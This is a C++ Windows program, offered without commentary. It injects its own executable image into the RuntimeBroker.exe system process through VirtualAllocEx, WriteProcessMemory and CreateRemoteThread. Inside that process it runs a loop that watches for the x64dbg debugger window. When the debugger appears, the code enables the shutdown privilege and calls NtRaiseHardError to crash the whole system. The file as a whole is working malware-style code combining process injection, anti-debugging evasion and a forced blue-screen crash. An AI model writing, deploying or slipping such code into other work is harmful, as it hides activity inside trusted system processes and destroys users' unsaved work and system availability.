#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

DWORD Process(const wchar_t* lpNameProcess)
{
    HANDLE snap;
    PROCESSENTRY32W pentry32;
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    pentry32.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32FirstW(snap, &pentry32))
    {
        CloseHandle(snap);
        return 0;
    }
    do
    {
        if (!lstrcmpiW(lpNameProcess, pentry32.szExeFile))
        {
            CloseHandle(snap);
            return pentry32.th32ProcessID;
        }
    } while (Process32NextW(snap, &pentry32));
    CloseHandle(snap);
    return 0;
}

BOOL Injection(HANDLE hProc, DWORD(WINAPI* func)(LPVOID))
{
    DWORD id;
    SIZE_T ByteOfWriten;
    HMODULE hModule = GetModuleHandle(NULL);
    DWORD size = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE*)(hModule)+((PIMAGE_DOS_HEADER)(hModule))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;
    char* hNewModule = (char*)VirtualAllocEx(hProc, hModule, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (hNewModule == NULL) return false;
    WriteProcessMemory(hProc, hNewModule, hModule, size, &ByteOfWriten);
    if (ByteOfWriten != size) return false;
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, func, (LPVOID)hNewModule, 0, &id);
    if (hThread == 0) return false;
    CloseHandle(hThread);
    return true;
}

DWORD WINAPI Function(LPVOID)
{
    while (true)
    {
        HANDLE Found = NULL;
        const wchar_t* x64dbg = L"Qt5QWindowIcon";
        Found = FindWindow(x64dbg, NULL);
        if (Found)
        {
            MessageBoxW(NULL, L"x64dbg Is Not Allowed", L"x64dbg Detected", MB_ICONINFORMATION);
            BOOLEAN PrivilegeState = FALSE;
            ULONG ErrorResponse = 0;
            RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
            NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
            break;
        }
    }
    return 0;
}

int main()
{
    const wchar_t ProcessName[] = L"RuntimeBroker.exe";
    DWORD pid = Process(ProcessName);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, Process(L"RuntimeBroker.exe"));
    if (hProcess != NULL)
    {
        Injection(hProcess, &Function);
        CloseHandle(hProcess);
    }
    std::cin.get();
    return 0;
}